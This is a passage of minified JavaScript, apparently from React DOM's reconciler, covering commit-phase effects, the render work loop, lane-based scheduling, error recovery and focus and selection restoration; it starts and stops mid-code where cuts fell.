te=0;te<K.length;te++)if(F=K[te],F.getAttribute("href")===(p.href==null||p.href===""?null:p.href)&&F.getAttribute("rel")===(p.rel==null?null:p.rel)&&F.getAttribute("title")===(p.title==null?null:p.title)&&F.getAttribute("crossorigin")===(p.crossOrigin==null?null:p.crossOrigin)){K.splice(te,1);break t}}F=D.createElement(g),ms(F,g,p),D.head.appendChild(F);break;case"meta":if(K=_$("meta","content",D).get(g+(p.content||""))){for(te=0;te<K.length;te++)if(F=K[te],F.getAttribute("content")===(p.content==null?null:""+p.content)&&F.getAttribute("name")===(p.name==null?null:p.name)&&F.getAttribute("property")===(p.property==null?null:p.property)&&F.getAttribute("http-equiv")===(p.httpEquiv==null?null:p.httpEquiv)&&F.getAttribute("charset")===(p.charSet==null?null:p.charSet)){K.splice(te,1);break t}}F=D.createElement(g),ms(F,g,p),D.head.appendChild(F);break;default:throw Error(r(468,g))}F[Ir]=u,zr(F),g=F}u.stateNode=g}else A$(D,u.type,u.stateNode);else u.stateNode=E$(D,g,u.memoizedProps);else F!==g?(F===null?p.stateNode!==null&&(p=p.stateNode,p.parentNode.removeChild(p)):F.count--,g===null?A$(D,u.type,u.stateNode):E$(D,g,u.memoizedProps)):g===null&&u.stateNode!==null&&PP(u,u.memoizedProps,p.memoizedProps)}break;case 27:Bo(d,u),jo(u),g&512&&(Si||p===null||gl(p,p.return)),p!==null&&g&4&&PP(u,u.memoizedProps,p.memoizedProps);break;case 5:if(Bo(d,u),jo(u),g&512&&(Si||p===null||gl(p,p.return)),u.flags&32){D=u.stateNode;try{Ms(D,"")}catch(vt){Yn(u,u.return,vt)}}g&4&&u.stateNode!=null&&(D=u.memoizedProps,PP(u,D,p!==null?p.memoizedProps:D)),g&1024&&(kP=!0);break;case 6:if(Bo(d,u),jo(u),g&4){if(u.stateNode===null)throw Error(r(162));g=u.memoizedProps,p=u.stateNode;try{p.nodeValue=g}catch(vt){Yn(u,u.return,vt)}}break;case 3:if(h3=null,D=uu,uu=d3(d.containerInfo),Bo(d,u),uu=D,jo(u),g&4&&p!==null&&p.memoizedState.isDehydrated)try{Xy(d.containerInfo)}catch(vt){Yn(u,u.return,vt)}kP&&(kP=!1,AF(u));break;case 4:g=uu,uu=d3(u.stateNode.containerInfo),Bo(d,u),jo(u),uu=g;break;case 12:Bo(d,u),jo(u);break;case 31:Bo(d,u),jo(u),g&4&&(g=u.updateQueue,g!==null&&(u.updateQueue=null,Q5(u,g)));break;case 13:Bo(d,u),jo(u),u.child.flags&8192&&u.memoizedState!==null!=(p!==null&&p.memoizedState!==null)&&(X5=Nn()),g&4&&(g=u.updateQueue,g!==null&&(u.updateQueue=null,Q5(u,g)));break;case 22:D=u.memoizedState!==null;var ce=p!==null&&p.memoizedState!==null,Ae=Cd,De=Si;if(Cd=Ae||D,Si=De||ce,Bo(d,u),Si=De,Cd=Ae,jo(u),g&8192)e:for(d=u.stateNode,d._visibility=D?d._visibility&-2:d._visibility|1,D&&(p===null||ce||Cd||Si||z0(u)),p=null,d=u;;){if(d.tag===5||d.tag===26){if(p===null){ce=p=d;try{if(F=ce.stateNode,D)K=F.style,typeof K.setProperty=="function"?K.setProperty("display","none","important"):K.display="none";else{te=ce.stateNode;var Le=ce.memoizedProps.style,Se=Le!=null&&Le.hasOwnProperty("display")?Le.display:null;te.style.display=Se==null||typeof Se=="boolean"?"":(""+Se).trim()}}catch(vt){Yn(ce,ce.return,vt)}}}else if(d.tag===6){if(p===null){ce=d;try{ce.stateNode.nodeValue=D?"":ce.memoizedProps}catch(vt){Yn(ce,ce.return,vt)}}}else if(d.tag===18){if(p===null){ce=d;try{var Pe=ce.stateNode;D?f$(Pe,!0):f$(ce.stateNode,!1)}catch(vt){Yn(ce,ce.return,vt)}}}else if((d.tag!==22&&d.tag!==23||d.memoizedState===null||d===u)&&d.child!==null){d.child.return=d,d=d.child;continue}if(d===u)break e;for(;d.sibling===null;){if(d.return===null||d.return===u)break e;p===d&&(p=null),d=d.return}p===d&&(p=null),d.sibling.return=d.return,d=d.sibling}g&4&&(g=u.updateQueue,g!==null&&(p=g.retryQueue,p!==null&&(g.retryQueue=null,Q5(u,p))));break;case 19:Bo(d,u),jo(u),g&4&&(g=u.updateQueue,g!==null&&(u.updateQueue=null,Q5(u,g)));break;case 30:break;case 21:break;default:Bo(d,u),jo(u)}}function jo(u){var d=u.flags;if(d&2){try{for(var p,g=u.return;g!==null;){if(pF(g)){p=g;break}g=g.return}if(p==null)throw Error(r(160));switch(p.tag){case 27:var D=p.stateNode,F=NP(u);Y5(u,F,D);break;case 5:var K=p.stateNode;p.flags&32&&(Ms(K,""),p.flags&=-33);var te=NP(u);Y5(u,te,K);break;case 3:case 4:var ce=p.stateNode.containerInfo,Ae=NP(u);OP(u,Ae,ce);break;default:throw Error(r(161))}}catch(De){Yn(u,u.return,De)}u.flags&=-3}d&4096&&(u.flags&=-4097)}function AF(u){if(u.subtreeFlags&1024)for(u=u.child;u!==null;){var d=u;AF(d),d.tag===5&&d.flags&1024&&d.stateNode.reset(),u=u.sibling}}function Td(u,d){if(d.subtreeFlags&8772)for(d=d.child;d!==null;)yF(u,d.alternate,d),d=d.sibling}function z0(u){for(u=u.child;u!==null;){var d=u;switch(d.tag){case 0:case 11:case 14:case 15:Ah(4,d,d.return),z0(d);break;case 1:gl(d,d.return);var p=d.stateNode;typeof p.componentWillUnmount=="function"&&fF(d,d.return,p),z0(d);break;case 27:av(d.stateNode);case 26:case 5:gl(d,d.return),z0(d);break;case 22:d.memoizedState===null&&z0(d);break;case 30:z0(d);break;default:z0(d)}u=u.sibling}}function xd(u,d,p){for(p=p&&(d.subtreeFlags&8772)!==0,d=d.child;d!==null;){var g=d.alternate,D=u,F=d,K=F.flags;switch(F.tag){case 0:case 11:case 15:xd(D,F,p),Qw(4,F);break;case 1:if(xd(D,F,p),g=F,D=g.stateNode,typeof D.componentDidMount=="function")try{D.componentDidMount()}catch(Ae){Yn(g,g.return,Ae)}if(g=F,D=g.updateQueue,D!==null){var te=g.stateNode;try{var ce=D.shared.hiddenCallbacks;if(ce!==null)for(D.shared.hiddenCallbacks=null,D=0;D<ce.length;D++)eL(ce[D],te)}catch(Ae){Yn(g,g.return,Ae)}}p&&K&64&&dF(F),Jw(F,F.return);break;case 27:mF(F);case 26:case 5:xd(D,F,p),p&&g===null&&K&4&&hF(F),Jw(F,F.return);break;case 12:xd(D,F,p);break;case 31:xd(D,F,p),p&&K&4&&vF(D,F);break;case 13:xd(D,F,p),p&&K&4&&EF(D,F);break;case 22:F.memoizedState===null&&xd(D,F,p),Jw(F,F.return);break;case 30:break;default:xd(D,F,p)}d=d.sibling}}function DP(u,d){var p=null;u!==null&&u.memoizedState!==null&&u.memoizedState.cachePool!==null&&(p=u.memoizedState.cachePool.pool),u=null,d.memoizedState!==null&&d.memoizedState.cachePool!==null&&(u=d.memoizedState.cachePool.pool),u!==p&&(u!=null&&u.refCount++,p!=null&&Uw(p))}function BP(u,d){u=null,d.alternate!==null&&(u=d.alternate.memoizedState.cache),d=d.memoizedState.cache,d!==u&&(d.refCount++,u!=null&&Uw(u))}function lu(u,d,p,g){if(d.subtreeFlags&10256)for(d=d.child;d!==null;)CF(u,d,p,g),d=d.sibling}function CF(u,d,p,g){var D=d.flags;switch(d.tag){case 0:case 11:case 15:lu(u,d,p,g),D&2048&&Qw(9,d);break;case 1:lu(u,d,p,g);break;case 3:lu(u,d,p,g),D&2048&&(u=null,d.alternate!==null&&(u=d.alternate.memoizedState.cache),d=d.memoizedState.cache,d!==u&&(d.refCount++,u!=null&&Uw(u)));break;case 12:if(D&2048){lu(u,d,p,g),u=d.stateNode;try{var F=d.memoizedProps,K=F.id,te=F.onPostCommit;typeof te=="function"&&te(K,d.alternate===null?"mount":"update",u.passiveEffectDuration,-0)}catch(ce){Yn(d,d.return,ce)}}else lu(u,d,p,g);break;case 31:lu(u,d,p,g);break;case 13:lu(u,d,p,g);break;case 23:break;case 22:F=d.stateNode,K=d.alternate,d.memoizedState!==null?F._visibility&2?lu(u,d,p,g):Xw(u,d):F._visibility&2?lu(u,d,p,g):(F._visibility|=2,Hy(u,d,p,g,(d.subtreeFlags&10256)!==0||!1)),D&2048&&DP(K,d);break;case 24:lu(u,d,p,g),D&2048&&BP(d.alternate,d);break;default:lu(u,d,p,g)}}function Hy(u,d,p,g,D){for(D=D&&((d.subtreeFlags&10256)!==0||!1),d=d.child;d!==null;){var F=u,K=d,te=p,ce=g,Ae=K.flags;switch(K.tag){case 0:case 11:case 15:Hy(F,K,te,ce,D),Qw(8,K);break;case 23:break;case 22:var De=K.stateNode;K.memoizedState!==null?De._visibility&2?Hy(F,K,te,ce,D):Xw(F,K):(De._visibility|=2,Hy(F,K,te,ce,D)),D&&Ae&2048&&DP(K.alternate,K);break;case 24:Hy(F,K,te,ce,D),D&&Ae&2048&&BP(K.alternate,K);break;default:Hy(F,K,te,ce,D)}d=d.sibling}}function Xw(u,d){if(d.subtreeFlags&10256)for(d=d.child;d!==null;){var p=u,g=d,D=g.flags;switch(g.tag){case 22:Xw(p,g),D&2048&&DP(g.alternate,g);break;case 24:Xw(p,g),D&2048&&BP(g.alternate,g);break;default:Xw(p,g)}d=d.sibling}}var ev=8192;function zy(u,d,p){if(u.subtreeFlags&ev)for(u=u.child;u!==null;)SF(u,d,p),u=u.sibling}function SF(u,d,p){switch(u.tag){case 26:zy(u,d,p),u.flags&ev&&u.memoizedState!==null&&t0e(p,uu,u.memoizedState,u.memoizedProps);break;case 5:zy(u,d,p);break;case 3:case 4:var g=uu;uu=d3(u.stateNode.containerInfo),zy(u,d,p),uu=g;break;case 22:u.memoizedState===null&&(g=u.alternate,g!==null&&g.memoizedState!==null?(g=ev,ev=16777216,zy(u,d,p),ev=g):zy(u,d,p));break;default:zy(u,d,p)}}function TF(u){var d=u.alternate;if(d!==null&&(u=d.child,u!==null)){d.child=null;do d=u.sibling,u.sibling=null,u=d;while(u!==null)}}function tv(u){var d=u.deletions;if((u.flags&16)!==0){if(d!==null)for(var p=0;p<d.length;p++){var g=d[p];Wi=g,IF(g,u)}TF(u)}if(u.subtreeFlags&10256)for(u=u.child;u!==null;)xF(u),u=u.sibling}function xF(u){switch(u.tag){case 0:case 11:case 15:tv(u),u.flags&2048&&Ah(9,u,u.return);break;case 3:tv(u);break;case 12:tv(u);break;case 22:var d=u.stateNode;u.memoizedState!==null&&d._visibility&2&&(u.return===null||u.return.tag!==13)?(d._visibility&=-3,J5(u)):tv(u);break;default:tv(u)}}function J5(u){var d=u.deletions;if((u.flags&16)!==0){if(d!==null)for(var p=0;p<d.length;p++){var g=d[p];Wi=g,IF(g,u)}TF(u)}for(u=u.child;u!==null;){switch(d=u,d.tag){case 0:case 11:case 15:Ah(8,d,d.return),J5(d);break;case 22:p=d.stateNode,p._visibility&2&&(p._visibility&=-3,J5(d));break;default:J5(d)}u=u.sibling}}function IF(u,d){for(;Wi!==null;){var p=Wi;switch(p.tag){case 0:case 11:case 15:Ah(8,p,d);break;case 23:case 22:if(p.memoizedState!==null&&p.memoizedState.cachePool!==null){var g=p.memoizedState.cachePool.pool;g!=null&&g.refCount++}break;case 24:Uw(p.memoizedState.cache)}if(g=p.child,g!==null)g.return=p,Wi=g;else e:for(p=u;Wi!==null;){g=Wi;var D=g.sibling,F=g.return;if(bF(g),g===p){Wi=null;break e}if(D!==null){D.return=F,Wi=D;break e}Wi=F}}}var gpe={getCacheForType:function(u){var d=hs(_i),p=d.data.get(u);return p===void 0&&(p=u(),d.data.set(u,p)),p},cacheSignal:function(){return hs(_i).controller.signal}},ype=typeof WeakMap=="function"?WeakMap:Map,Hn=0,ur=null,ln=null,fn=0,Zn=0,Ia=null,Ch=!1,qy=!1,jP=!1,Id=0,ti=0,Sh=0,q0=0,MP=0,Ra=0,Vy=0,nv=null,Mo=null,UP=!1,X5=0,RF=0,e3=1/0,t3=null,Th=null,Ui=0,xh=null,Wy=null,Rd=0,LP=0,FP=null,PF=null,rv=0,$P=null;function Pa(){return(Hn&2)!==0&&fn!==0?fn&-fn:C.T!==null?GP():nh()}function NF(){if(Ra===0)if((fn&536870912)===0||gn){var u=sc;sc<<=1,(sc&3932160)===0&&(sc=262144),Ra=u}else Ra=536870912;return u=Ta.current,u!==null&&(u.flags|=32),Ra}function Uo(u,d,p){(u===ur&&(Zn===2||Zn===9)||u.cancelPendingCommit!==null)&&(Gy(u,0),Ih(u,fn,Ra,!1)),to(u,p),((Hn&2)===0||u!==ur)&&(u===ur&&((Hn&2)===0&&(q0|=p),ti===4&&Ih(u,fn,Ra,!1)),yl(u))}function OF(u,d,p){if((Hn&6)!==0)throw Error(r(327));var g=!p&&(d&127)===0&&(d&u.expiredLanes)===0||as(u,d),D=g?vpe(u,d):zP(u,d,!0),F=g;do{if(D===0){qy&&!g&&Ih(u,d,0,!1);break}else{if(p=u.current.alternate,F&&!bpe(p)){D=zP(u,d,!1),F=!1;continue}if(D===2){if(F=d,u.errorRecoveryDisabledLanes&F)var K=0;else K=u.pendingLanes&-536870913,K=K!==0?K:K&536870912?536870912:0;if(K!==0){d=K;e:{var te=u;D=nv;var ce=te.current.memoizedState.isDehydrated;if(ce&&(Gy(te,K).flags|=256),K=zP(te,K,!1),K!==2){if(jP&&!ce){te.errorRecoveryDisabledLanes|=F,q0|=F,D=4;break e}F=Mo,Mo=D,F!==null&&(Mo===null?Mo=F:Mo.push.apply(Mo,F))}D=K}if(F=!1,D!==2)continue}}if(D===1){Gy(u,0),Ih(u,d,0,!0);break}e:{switch(g=u,F=D,F){case 0:case 1:throw Error(r(345));case 4:if((d&4194048)!==d)break;case 6:Ih(g,d,Ra,!Ch);break e;case 2:Mo=null;break;case 3:case 5:break;default:throw Error(r(329))}if((d&62914560)===d&&(D=X5+300-Nn(),10<D)){if(Ih(g,d,Ra,!Ch),Io(g,0,!0)!==0)break e;Rd=d,g.timeoutHandle=u$(kF.bind(null,g,p,Mo,t3,UP,d,Ra,q0,Vy,Ch,F,"Throttled",-0,0),D);break e}kF(g,p,Mo,t3,UP,d,Ra,q0,Vy,Ch,F,null,-0,0)}}break}while(!0);yl(u)}function kF(u,d,p,g,D,F,K,te,ce,Ae,De,Le,Se,Pe){if(u.timeoutHandle=-1,Le=d.subtreeFlags,Le&8192||(Le&16785408)===16785408){Le={stylesheets:null,count:0,imgCount:0,imgBytes:0,suspenseyImages:[],waitingForImages:!0,waitingForViewTransition:!1,unsuspend:_a},SF(d,F,Le);var vt=(F&62914560)===F?X5-Nn():(F&4194048)===F?RF-Nn():0;if(vt=n0e(Le,vt),vt!==null){Rd=F,u.cancelPendingCommit=vt($F.bind(null,u,d,F,p,g,D,K,te,ce,De,Le,null,Se,Pe)),Ih(u,F,K,!Ae);return}}$F(u,d,F,p,g,D,K,te,ce)}function bpe(u){for(var d=u;;){var p=d.tag;if((p===0||p===11||p===15)&&d.flags&16384&&(p=d.updateQueue,p!==null&&(p=p.stores,p!==null)))for(var g=0;g<p.length;g++){var D=p[g],F=D.getSnapshot;D=D.value;try{if(!Ca(F(),D))return!1}catch{return!1}}if(p=d.child,d.subtreeFlags&16384&&p!==null)p.return=d,d=p;else{if(d===u)break;for(;d.sibling===null;){if(d.return===null||d.return===u)return!0;d=d.return}d.sibling.return=d.return,d=d.sibling}}return!0}function Ih(u,d,p,g){d&=~MP,d&=~q0,u.suspendedLanes|=d,u.pingedLanes&=~d,g&&(u.warmLanes|=d),g=u.expirationTimes;for(var D=d;0<D;){var F=31-br(D),K=1<<F;g[F]=-1,D&=~K}p!==0&&tu(u,p,d)}function n3(){return(Hn&6)===0?(iv(0),!1):!0}function HP(){if(ln!==null){if(Zn===0)var u=ln.return;else u=ln,bd=B0=null,iP(u),My=null,Fw=0,u=ln;for(;u!==null;)lF(u.alternate,u),u=u.return;ln=null}}function Gy(u,d){var p=u.timeoutHandle;p!==-1&&(u.timeoutHandle=-1,Upe(p)),p=u.cancelPendingCommit,p!==null&&(u.cancelPendingCommit=null,p()),Rd=0,HP(),ur=u,ln=p=gd(u.current,null),fn=d,Zn=0,Ia=null,Ch=!1,qy=as(u,d),jP=!1,Vy=Ra=MP=q0=Sh=ti=0,Mo=nv=null,UP=!1,(d&8)!==0&&(d|=d&32);var g=u.entangledLanes;if(g!==0)for(u=u.entanglements,g&=d;0<g;){var D=31-br(g),F=1<<D;d|=u[D],g&=~F}return Id=d,A5(),p}function DF(u,d){Yt=null,C.H=Kw,d===jy||d===N5?(d=YU(),Zn=3):d===WR?(d=YU(),Zn=4):Zn=d===vP?8:d!==null&&typeof d=="object"&&typeof d.then=="function"?6:1,Ia=d,ln===null&&(ti=1,V5(u,hc(d,u.current)))}function BF(){var u=Ta.current;return u===null?!0:(fn&4194048)===fn?yc===null:(fn&62914560)===fn||(fn&536870912)!==0?u===yc:!1}function jF(){var u=C.H;return C.H=Kw,u===null?Kw:u}function MF(){var u=C.A;return C.A=gpe,u}function r3(){ti=4,Ch||(fn&4194048)!==fn&&Ta.current!==null||(qy=!0),(Sh&134217727)===0&&(q0&134217727)===0||ur===null||Ih(ur,fn,Ra,!1)}function zP(u,d,p){var g=Hn;Hn|=2;var D=jF(),F=MF();(ur!==u||fn!==d)&&(t3=null,Gy(u,d)),d=!1;var K=ti;e:do try{if(Zn!==0&&ln!==null){var te=ln,ce=Ia;switch(Zn){case 8:HP(),K=6;break e;case 3:case 2:case 9:case 6:Ta.current===null&&(d=!0);var Ae=Zn;if(Zn=0,Ia=null,Ky(u,te,ce,Ae),p&&qy){K=0;break e}break;default:Ae=Zn,Zn=0,Ia=null,Ky(u,te,ce,Ae)}}wpe(),K=ti;break}catch(De){DF(u,De)}while(!0);return d&&u.shellSuspendCounter++,bd=B0=null,Hn=g,C.H=D,C.A=F,ln===null&&(ur=null,fn=0,A5()),K}function wpe(){for(;ln!==null;)UF(ln)}function vpe(u,d){var p=Hn;Hn|=2;var g=jF(),D=MF();ur!==u||fn!==d?(t3=null,e3=Nn()+500,Gy(u,d)):qy=as(u,d);e:do try{if(Zn!==0&&ln!==null){d=ln;var F=Ia;t:switch(Zn){case 1:Zn=0,Ia=null,Ky(u,d,F,1);break;case 2:case 9:if(KU(F)){Zn=0,Ia=null,LF(d);break}d=function(){Zn!==2&&Zn!==9||ur!==u||(Zn=7),yl(u)},F.then(d,d);break e;case 3:Zn=7;break e;case 4:Zn=5;break e;case 7:KU(F)?(Zn=0,Ia=null,LF(d)):(Zn=0,Ia=null,Ky(u,d,F,7));break;case 5:var K=null;switch(ln.tag){case 26:K=ln.memoizedState;case 5:case 27:var te=ln;if(K?C$(K):te.stateNode.complete){Zn=0,Ia=null;var ce=te.sibling;if(ce!==null)ln=ce;else{var Ae=te.return;Ae!==null?(ln=Ae,i3(Ae)):ln=null}break t}}Zn=0,Ia=null,Ky(u,d,F,5);break;case 6:Zn=0,Ia=null,Ky(u,d,F,6);break;case 8:HP(),ti=6;break e;default:throw Error(r(462))}}Epe();break}catch(De){DF(u,De)}while(!0);return bd=B0=null,C.H=g,C.A=D,Hn=p,ln!==null?0:(ur=null,fn=0,A5(),ti)}function Epe(){for(;ln!==null&&!xn();)UF(ln)}function UF(u){var d=cF(u.alternate,u,Id);u.memoizedProps=u.pendingProps,d===null?i3(u):ln=d}function LF(u){var d=u,p=d.alternate;switch(d.tag){case 15:case 0:d=nF(p,d,d.pendingProps,d.type,void 0,fn);break;case 11:d=nF(p,d,d.pendingProps,d.type.render,d.ref,fn);break;case 5:iP(d);default:lF(p,d),d=ln=MU(d,Id),d=cF(p,d,Id)}u.memoizedProps=u.pendingProps,d===null?i3(u):ln=d}function Ky(u,d,p,g){bd=B0=null,iP(d),My=null,Fw=0;var D=d.return;try{if(upe(u,D,d,p,fn)){ti=1,V5(u,hc(p,u.current)),ln=null;return}}catch(F){if(D!==null)throw ln=D,F;ti=1,V5(u,hc(p,u.current)),ln=null;return}d.flags&32768?(gn||g===1?u=!0:qy||(fn&536870912)!==0?u=!1:(Ch=u=!0,(g===2||g===9||g===3||g===6)&&(g=Ta.current,g!==null&&g.tag===13&&(g.flags|=16384))),FF(d,u)):i3(d)}function i3(u){var d=u;do{if((d.flags&32768)!==0){FF(d,Ch);return}u=d.return;var p=fpe(d.alternate,d,Id);if(p!==null){ln=p;return}if(d=d.sibling,d!==null){ln=d;return}ln=d=u}while(d!==null);ti===0&&(ti=5)}function FF(u,d){do{var p=hpe(u.alternate,u);if(p!==null){p.flags&=32767,ln=p;return}if(p=u.return,p!==null&&(p.flags|=32768,p.subtreeFlags=0,p.deletions=null),!d&&(u=u.sibling,u!==null)){ln=u;return}ln=u=p}while(u!==null);ti=6,ln=null}function $F(u,d,p,g,D,F,K,te,ce){u.cancelPendingCommit=null;do s3();while(Ui!==0);if((Hn&6)!==0)throw Error(r(327));if(d!==null){if(d===u.current)throw Error(r(177));if(F=d.lanes|d.childLanes,F|=NR,eu(u,p,F,K,te,ce),u===ur&&(ln=ur=null,fn=0),Wy=d,xh=u,Rd=p,LP=F,FP=D,PF=g,(d.subtreeFlags&10256)!==0||(d.flags&10256)!==0?(u.callbackNode=null,u.callbackPriority=0,Spe(dt,function(){return WF(),null})):(u.callbackNode=null,u.callbackPriority=0),g=(d.flags&13878)!==0,(d.subtreeFlags&13878)!==0||g){g=C.T,C.T=null,D=j.p,j.p=2,K=Hn,Hn|=4;try{ppe(u,d,p)}finally{Hn=K,j.p=D,C.T=g}}Ui=1,HF(),zF(),qF()}}function HF(){if(Ui===1){Ui=0;var u=xh,d=Wy,p=(d.flags&13878)!==0;if((d.subtreeFlags&13878)!==0||p){p=C.T,C.T=null;var g=j.p;j.p=2;var D=Hn;Hn|=4;try{_F(d,u);var F=tN,K=IU(u.containerInfo),te=F.focusedElem,ce=F.selectionRange;if(K!==te&&te&&te.ownerDocument&&xU(te.ownerDocument.documentElement,te)){if(ce!==null&&TR(te)){var Ae=ce.start,De=ce.end;if(De===void 0&&(De=Ae),"selectionStart"in te)te.selectionStart=Ae,te.selectionEnd=Math.min(De,te.value.length);else{var Le=te.ownerDocument||document,Se=Le&&Le.defaultView||window;if(Se.getSelection){var Pe=Se.getSelection(),vt=te.textContent.length,Ut=Math.min(ce.start,vt),sr=ce.end===void 0?Ut:Math.min(ce.end,vt);!Pe.extend&&Ut>sr&&(K=sr,sr=Ut,Ut=K);var ye=TU(te,Ut),fe=TU(te,sr);if(ye&&fe&&(Pe.rangeCount!==1||Pe.anchorNode!==ye.node||Pe.anchorOffset!==ye.offset||Pe.focusNode!==fe.node||Pe.focusOffset!==fe.offset)){var _e=Le.createRange();_e.setStart(ye.node,ye.offset),Pe.removeAllRanges(),Ut>sr?(Pe.addRange(_e),Pe.extend(fe.node,fe.offset)):(_e.setEnd(fe.node,fe.offset),Pe.addRange(_e))}}}}for(Le=[],Pe=te;Pe=Pe.parentNode;)Pe.nodeType===1&&Le.push({element:Pe,left:Pe.scrollLeft,top:Pe.scrollTop});for(typeof te.focus=="function"&&te.focus(),te=0;te<Le.length;te++){var je=Le[te];je.element.scrollLeft=je.left,je.element.scrollTop=je.top}}y3=!!eN,tN=eN=null}finally{Hn=D,j.p=g,C.T=p}}u.current=d,Ui=2}}function zF(){if(Ui===2){Ui=0;var u=xh,d=Wy,p=(d.flags&8772)!==0;if((d.subtreeFlags&8772)!==0||p){p=C.T,C.T=null;var g=j.p;j.p=2;var D=Hn;Hn|=4;try{yF(u,d.alternate,d)}finally{Hn=D,j.p=g,C.T=p}}Ui=3}}function qF(){if(Ui===4||Ui===3){Ui=0,Ln();var u=xh,d=Wy,p=Rd,g=PF;(d.subtreeFlags&10256)!==0||(d.flags&10256)!==0?Ui=5:(Ui=0,Wy=xh=null,VF(u,u.pendingLanes));var D=u.pendingLanes;if(D===0&&(Th=null),va(p),d=d.stateNode,xr&&typeof xr.onCommitFiberRoot=="function")try{xr.onCommitFiberRoot(Hr,d,void 0,(d.current.flags&128)===128)}catch{}if(g!==null){d=C.T,D=j.p,j.p=2,C.T=null;try{for(var F=u.onRecoverableError,K=0;K<g.length;K++){var te=g[K];F(te.value,{componentStack:te.stack})}}finally{C.T=d,j.p=D}}(Rd&3)!==0&&s3(),yl(u),D=u.pendingLanes,(p&261930)!==0&&(D&42)!==0?u===$P?rv++:(rv=0,$P=u):rv=0,iv(0)}}function VF(u,d){(u.pooledCacheLanes&=d)===0&&(d=u.pooledCache,d!=null&&(u.pooledCache=null,Uw(d)))}function s3(){return HF(),zF(),qF(),WF()}function WF(){if(Ui!==5)return!1;var u=xh,d=LP;LP=0;var p=va(Rd),g=C.T,D=j.p;try{j.p=32>p?32:p,C.T=null,p=FP,FP=null;var F=xh,K=Rd;if(Ui=0,Wy=xh=null,Rd=0,(Hn&6)!==0)throw Error(r(331));var te=Hn;if(Hn|=4,xF(F.current),CF(F,F.current,K,p),Hn=te,iv(0,!1),xr&&typeof xr.onPostCommitFiberRoot=="function")try{xr.onPostCommitFiberRoot(Hr,F)}catch{}return!0}finally{j.p=D,C.T=g,VF(u,d)}}function GF(u,d,p){d=hc(p,d),d=wP(u.stateNode,d,2),u=vh(u,d,2),u!==null&&(to(u,2),yl(u))}function Yn(u,d,p){if(u.tag===3)GF(u,u,p);else for(;d!==null;){if(d.tag===3){GF(d,u,p);break}else if(d.tag===1){var g=d.stateNode;if(typeof d.type.getDerivedStateFromError=="function"||typeof g.componentDidCatch=="function"&&(Th===null||!Th.has(g))){u=hc(p,u),p=KL(2),g=vh(d,p,2),g!==null&&(ZL(p,g,d,u),to(g,2),yl(g));break}}d=d.return}}function qP(u,d,p){var g=u.pingCache;if(g===null){g=u.pingCache=new ype;var D=new Set;g.set(d,D)}else D=g.get(d),D===void 0&&(D=new Set,g.set(d,D));D.has(p)||(jP=!0,D.add(p),u=_pe.bind(null,u,d,p),d.then(u,u))}function _pe(u,d,p){var g=u.pingCache;g!==null&&g.delete(d),u.pingedLanes|=u.suspendedLanes&p,u.warmLanes&=~p,ur===u&&(fn&p)===p&&(ti===4||ti===3&&(fn&62914560)===fn&&300>Nn()-X5?(Hn&2)===0&&Gy(u,0):MP|=p,Vy===fn&&(Vy=0)),yl(u)}function KF(u,d){d===0&&(d=el()),u=O0(u,d),u!==null&&(to(u,d),yl(u))}function Ape(u){var d=u.memoizedState,p=0;d!==null&&(p=d.retryLane),KF(u,p)}function Cpe(u,d){var p=0;switch(u.tag){case 31:case 13:var g=u.stateNode,D=u.memoizedState;D!==null&&(p=D.retryLane);break;case 19:g=u.stateNode;break;case 22:g=u.stateNode._retryCache;break;default:throw Error(r(314))}g!==null&&g.delete(d),KF(u,p)}function Spe(u,d){return ze(u,d)}var o3=null,Zy=null,VP=!1,a3=!1,WP=!1,Rh=0;function yl(u){u!==Zy&&u.next===null&&(Zy===null?o3=Zy=u:Zy=Zy.next=u),a3=!0,VP||(VP=!0,xpe())}function iv(u,d){if(!WP&&a3){WP=!0;do for(var p=!1,g=o3;g!==null;){if(u!==0){var D=g.pendingLanes;if(D===0)var F=0;else{var K=g.suspendedLanes,te=g.pingedLanes;F=(1<<31-br(42|u)+1)-1,F&=D&~(K&~te),F=F&201326741?F&201326741|1:F?F|2:0}F!==0&&(p=!0,JF(g,F))}else F=fn,F=Io(g,g===ur?F:0,g.cancelPendingCommit!==null||g.timeoutHandle!==-1),(F&3)===0||as(g,F)||(p=!0,JF(g,F));g=g.next}while(p);WP=!1}}function Tpe(){ZF()}function ZF(){a3=VP=!1;var u=0;Rh!==0&&Mpe()&&(u=Rh);for(var d=Nn(),p=null,g=o3;g!==null;){var D=g.next,F=YF(g,d);F===0?(g.next=null,p===null?o3=D:p.next=D,D===null&&(Zy=p)):(p=g,(u!==0||(F&3)!==0)&&(a3=!0)),g=D}Ui!==0&&Ui!==5||iv(u),Rh!==0&&(Rh=0)}function YF(u,d){for(var p=u.suspendedLanes,g=u.pingedLanes,D=u.expirationTimes,F=u.pendingLanes&-62914561;0<F;){var K=31-br(F),te=1<<K,ce=D[K];ce===-1?((te&p)===0||(te&g)!==0)&&(D[K]=g0(te,d)):ce<=d&&(u.expiredLanes|=te),F&=~te}if(d=ur,p=fn,p=Io(u,u===d?p:0,u.cancelPendingCommit!==null||u.timeoutHandle!==-1),g=u.callbackNode,p===0||u===d&&(Zn===2||Zn===9)||u.cancelPendingCommit!==null)return g!==null&&g!==null&&Re(g),u.callbackNode=null,u.callbackPriority=0;if((p&3)===0||as(u,p)){if(d=p&-p,d===u.callbackPriority)return d;switch(g!==null&&Re(g),va(p)){case 2:case 8:p=Qe;break;case 32:p=dt;break;case 268435456:p=ui;break;default:p=dt}return g=QF.bind(null,u),p=ze(p,g),u.callbackPriority=d,u.callbackNode=p,d}return g!==null&&g!==null&&Re(g),u.callbackPriority=2,u.callbackNode=null,2}function QF(u,d){if(Ui!==0&&Ui!==5)return u.callbackNode=null,u.callbackPriority=0,null;var p=u.callbackNode;if(s3()&&u.callbackNode!==p)return null;var g=fn;return g=Io(u,u===ur?g:0,u.cancelPendingCommit!==null||u.timeoutHandle!==-1),g===0?null:(OF(u,g,d),YF(u,Nn()),u.callbackNode!=null&&u.callbackNode===p?QF.bind(null,u):null)}function JF(u,d){if(s3())return null;OF(u,d,!0)}function xpe(){Lpe(function(){(Hn&6)!==0?ze(Ve,Tpe):ZF()})}function GP(){if(Rh===0){var u=Dy;u===0&&(u=To,To<<=1,(To&261888)===0&&(To=256)),Rh=u}return Rh}function XF(u){return u==null||typeof u=="symbol"||typeof u=="boolean"?null:typeof u=="function"?u:ol(""+u)}function e$(u,d){var p=d.ownerDocument.createElement("input");return p.name=d.name,p.value=d.value,u.id&&p.setAttribute("form",u.id),d.parentNode.insertBefore(p,d),u=new FormData(u),p.parentNode.removeChild(p),u}function 